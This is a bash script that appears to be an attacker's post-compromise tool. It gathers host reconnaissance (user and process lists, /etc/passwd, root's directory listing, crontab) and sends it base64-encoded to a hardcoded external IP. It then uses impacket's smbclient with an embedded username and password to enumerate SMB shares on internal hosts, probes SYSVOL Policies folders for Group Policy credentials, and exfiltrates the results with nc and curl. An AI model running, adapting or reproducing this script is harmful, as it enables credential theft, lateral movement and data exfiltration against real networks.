#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
#MRUNJOB wrapper not needed; launched via mhook one-shot
S=/tmp/imp/impacket/examples/smbclient.py
export PYTHONPATH=/tmp/imp
O=/tmp/.ADE4.txt; : > "$O"
CRED='MLT/3cx:!QAZxsw2'
probe() { # ip share cmds...
  ip=$1; sh=$2; shift 2
  echo "### $ip $sh" >> "$O"
  { for c in "$@"; do echo "$c"; done; sleep 1; } | timeout 40 python3 "$S" "$CRED@$ip" >> "$O" 2>&1
  echo "### END $ip $sh" >> "$O"
}
for ip in 10.61.10.10 10.61.10.11 10.61.10.12; do
  case $ip in
    10.61.10.10) SHS="SYSVOL Public_M Public_S Public_T";;
    10.61.10.11) SHS="SYSVOL";;
    10.61.10.12) SHS="VBRCatalog Users";;
  esac
  for sh in $SHS; do probe $ip "$sh" "use $sh" "ls"; done
done
# depth-2 guesses for SYSVOL GPP
for ip in 10.61.10.10 10.61.10.11; do
  for d in MLT mlt MLT.local mlt.local dbr.gov.ua; do
    probe $ip SYSVOL "use SYSVOL" "cd $d" "ls"
    probe $ip SYSVOL "use SYSVOL" "cd $d/Policies" "ls"
    probe $ip SYSVOL "use SYSVOL" "cd $d\\Policies" "ls"
    probe $ip SYSVOL "use SYSVOL" "cd /$d/Policies" "ls"
  done
done
b=$(base64 -w0 "$O" 2>/dev/null); ( echo -e "POST /up HTTP/1.0\r\nHost: 131.123.43.239\r\nX-Name: mel_lat_ade4\r\nContent-Length: ${#b}\r\n\r\n$b" | timeout 90 nc 131.123.43.239 80 ) >/dev/null 2>&1
echo ADE4_DONE
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


